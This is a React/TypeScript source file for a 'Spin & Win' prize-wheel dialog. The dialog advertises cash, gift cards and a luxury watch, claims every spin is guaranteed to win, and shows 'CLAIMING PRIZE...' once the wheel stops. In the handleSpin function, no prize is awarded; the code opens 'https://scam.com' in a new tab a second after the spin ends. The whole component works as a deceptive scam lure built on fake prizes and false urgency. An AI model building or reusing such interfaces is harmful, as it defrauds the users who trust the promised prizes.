import React, { useState, useEffect } from 'react';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  Box,
  Typography,
  Button,
  IconButton
} from '@mui/material';
import CloseIcon from '@mui/icons-material/Close';

interface SpinWheelProps {
  open: boolean;
  onClose: () => void;
}

const prizes = [
  '💰 $500 CASH',
  '🎁 MYSTERY BOX',
  '🛍️ $100 GIFT CARD',
  '🏆 GRAND PRIZE',
  '🎮 GAMING BUNDLE',
  '💎 LUXURY WATCH',
  '🌟 VIP ACCESS',
  '🎯 FREE SPINS'
];

export const SpinWheel: React.FC<SpinWheelProps> = ({ open, onClose }) => {
  const [rotation, setRotation] = useState(0);
  const [isSpinning, setIsSpinning] = useState(false);
  const [hasSpun, setHasSpun] = useState(false);

  const handleSpin = () => {
    if (!isSpinning && !hasSpun) {
      setIsSpinning(true);
      const randomRotation = 1800 + Math.random() * 360; // At least 5 full rotations
      setRotation(rotation + randomRotation);
      
      setTimeout(() => {
        setIsSpinning(false);
        setHasSpun(true);
        setTimeout(() => {
          window.open('https://scam.com', '_blank');
        }, 1000);
      }, 5000);
    }
  };

  return (
    <Dialog 
      open={open} 
      onClose={onClose}
      maxWidth="sm"
      fullWidth
      PaperProps={{
        sx: {
          background: 'linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%)',
          border: '3px solid #FFD700',
        }
      }}
    >
      <DialogTitle sx={{ textAlign: 'center', color: 'white', position: 'relative' }}>
        <IconButton
          aria-label="close"
          onClick={onClose}
          sx={{
            position: 'absolute',
            right: 8,
            top: 8,
            color: 'white',
            bgcolor: 'rgba(255,255,255,0.1)',
            '&:hover': {
              bgcolor: 'rgba(255,255,255,0.2)',
            }
          }}
        >
          <CloseIcon />
        </IconButton>
        <Typography variant="h4" sx={{ fontWeight: 'bold' }}>
          🎡 Spin & Win! 🎡
        </Typography>
        <Typography variant="subtitle1" sx={{ mt: 1, color: '#FFE4B5' }}>
          Spin the wheel for a chance to win amazing prizes!
        </Typography>
      </DialogTitle>
      <DialogContent>
        <Box
          sx={{
            position: 'relative',
            width: '300px',
            height: '300px',
            margin: '20px auto',
          }}
        >
          {/* Wheel */}
          <Box
            sx={{
              width: '100%',
              height: '100%',
              borderRadius: '50%',
              border: '10px solid #FFD700',
              position: 'relative',
              transition: 'transform 5s cubic-bezier(0.17, 0.67, 0.12, 0.99)',
              transform: `rotate(${rotation}deg)`,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              background: '#FFF',
              '&::before': {
                content: '""',
                position: 'absolute',
                width: '100%',
                height: '100%',
                border: '2px solid #FFD700',
                borderRadius: '50%',
                boxSizing: 'border-box',
              }
            }}
          >
            {prizes.map((prize, index) => (
              <Typography
                key={index}
                sx={{
                  position: 'absolute',
                  width: '50%',
                  textAlign: 'right',
                  transformOrigin: '0% 50%',
                  left: '50%',
                  transform: `rotate(${index * (360 / prizes.length)}deg)`,
                  padding: '5px',
                  fontSize: '0.8rem',
                  fontWeight: 'bold',
                }}
              >
                {prize}
              </Typography>
            ))}
          </Box>
          
          {/* Pointer */}
          <Box
            sx={{
              position: 'absolute',
              top: '-20px',
              left: '50%',
              transform: 'translateX(-50%)',
              width: 0,
              height: 0,
              borderLeft: '20px solid transparent',
              borderRight: '20px solid transparent',
              borderTop: '40px solid #FFD700',
              zIndex: 1,
            }}
          />
        </Box>
        
        <Button
          variant="contained"
          fullWidth
          disabled={isSpinning || hasSpun}
          sx={{
            mt: 2,
            bgcolor: '#FFD700',
            color: '#000',
            fontWeight: 'bold',
            fontSize: '1.2rem',
            py: 1.5,
            '&:hover': {
              bgcolor: '#FFC000',
            },
            '&.Mui-disabled': {
              bgcolor: '#FFE699',
              color: '#666',
            }
          }}
          onClick={handleSpin}
        >
          {isSpinning ? 'SPINNING...' : hasSpun ? 'CLAIMING PRIZE...' : 'SPIN NOW!'}
        </Button>
        
        <Typography 
          variant="caption" 
          sx={{ 
            display: 'block', 
            textAlign: 'center', 
            mt: 2,
            color: '#FFE4B5'
          }}
        >
          *Every spin guaranteed to win! Limited time offer only.
        </Typography>
      </DialogContent>
    </Dialog>
  );
};
